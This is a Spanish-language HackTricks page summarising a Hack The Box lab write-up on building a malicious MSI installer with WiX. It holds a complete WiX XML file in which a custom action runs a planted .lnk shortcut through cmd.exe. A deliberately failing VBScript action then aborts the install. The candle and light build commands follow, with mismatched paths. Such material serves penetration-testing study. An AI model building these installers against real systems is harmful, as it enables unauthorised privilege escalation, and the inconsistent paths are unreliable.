{{#include ../../banners/hacktricks-training.md}}

# Creación de MSI Malicioso y Obtención de Root

La creación del instalador MSI se realizará utilizando wixtools, específicamente se utilizará [wixtools](http://wixtoolset.org). Vale la pena mencionar que se intentaron constructores de MSI alternativos, pero no tuvieron éxito en este caso particular.

Para una comprensión completa de los ejemplos de uso de wix MSI, se aconseja consultar [esta página](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Aquí, puedes encontrar varios ejemplos que demuestran el uso de wix MSI.

El objetivo es generar un MSI que ejecute el archivo lnk. Para lograr esto, se podría emplear el siguiente código XML ([xml de aquí](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Es importante notar que el elemento Package contiene atributos como InstallerVersion y Compressed, que especifican la versión del instalador e indican si el paquete está comprimido o no, respectivamente.

El proceso de creación implica utilizar candle.exe, una herramienta de wixtools, para generar un wixobject a partir de msi.xml. El siguiente comando debe ser ejecutado:
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
Además, vale la pena mencionar que se proporciona una imagen en la publicación, que muestra el comando y su salida. Puedes referirte a ella para obtener orientación visual.

Además, se utilizará light.exe, otra herramienta de wixtools, para crear el archivo MSI a partir del wixobject. El comando que se ejecutará es el siguiente:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Similar al comando anterior, se incluye una imagen en la publicación que ilustra el comando y su salida.

Tenga en cuenta que, aunque este resumen tiene como objetivo proporcionar información valiosa, se recomienda consultar la publicación original para obtener detalles más completos e instrucciones precisas.

## Referencias

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
